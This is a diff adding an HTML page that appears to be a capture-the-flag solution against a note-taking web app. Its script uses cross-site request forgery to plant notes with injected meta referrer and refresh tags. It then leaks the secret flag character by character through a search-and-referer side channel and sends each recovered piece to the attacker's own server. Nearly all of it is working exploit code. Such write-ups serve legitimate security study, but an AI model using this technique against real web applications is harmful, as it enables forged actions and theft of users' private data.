@@ -1,0 +1,62 @@
+<html>
+
+<body>
+    <form method="post" target="p">
+        <input type="text" name="content">
+    </form>
+    <script>
+        const TARGET = "https://localhost:8080"
+        const form = document.querySelector("form")
+        const input = document.querySelector("input")
+        const redirectedUrl = `${location.origin}/set-referer`
+
+        form.action = TARGET + "/create-note"
+
+        function sleep(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // create note using CSRF
+        function createNote(value) {
+            input.value = value
+            form.submit()
+        }
+        // get note path/id using meta redirect referer trick
+        async function getNoteId(value){
+            open(`${TARGET}/search-notes?query=view:${encodeURIComponent(value)}`, 'p')
+            const res = await fetch("/get-referer")
+            return await res.text()
+        }
+        async function leak(known){
+            const chars = "}_abcdefghijklmnopqrstuvwxyz1234567890";
+            // start of the prefix must be started with the lowest character order in ascii table, in this case i use "*"
+            const prefix = "*"+["@", ...chars].map((c) => known + c).join("|");
+            for (let i = 0; i < 12; i++) {
+                // using referer trick to leak note url
+                createNote(`${prefix}<meta name="referrer" content="unsafe-url"><meta http-equiv="Refresh" content="0; URL=${redirectedUrl}">`)
+                await sleep(200)
+            }
+            // get first note id
+            const one = await getNoteId(known+"@")
+            for (c in chars){
+                // try to get note id after shuffled
+                const two = await getNoteId(known+chars[c])
+                // if its shuffled the known+chars[c] is in our flag
+                if (one != two){
+                    return known+chars[c]
+                }
+            }
+            throw Error("char not found!")
+        }
+        async function main(){
+            var known = "FINDIT{"
+            while (known[known.length-1] != "}"){
+                known = await leak(known)
+                fetch(`/?flag=${known}`)
+            }
+        }
+        main()
+    </script>
+</body>
+
+</html>
